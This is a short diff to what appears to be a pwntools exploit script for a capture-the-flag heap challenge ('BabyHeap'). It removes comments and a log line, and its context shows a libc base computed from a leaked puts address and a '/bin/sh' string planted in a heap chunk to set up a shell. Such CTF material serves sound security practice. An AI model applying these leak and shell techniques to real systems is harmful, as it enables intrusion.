@@ -13,7 +13,7 @@ def add(p, content, size=None):
   """
   scaffolding for communitcathing with the program
   """
-  # BabyHeap CTF-3
+
   if not size:
     size = len(content)
   p.sendlineafter("Choice:", '1')
@@ -82,7 +82,6 @@ def add(p, content, size=None):
   """
   scaffolding for communitcathing with the program
   """
-  # BabyHeap CTF-3
   if not size:
     size = len(content)
   p.sendlineafter("Choice:", '1')
@@ -439,7 +438,7 @@ def edit(idx,content):
 
 p.recvuntil('as gift: ')
 libcbase = int(p.recvn(14),16)-libc.sym['puts']
-log.success('libcbase = '+hex(libcbase))
+
 
 add(0x100,'a'*0x60)
 add(0x10,'/bin/sh\x00')
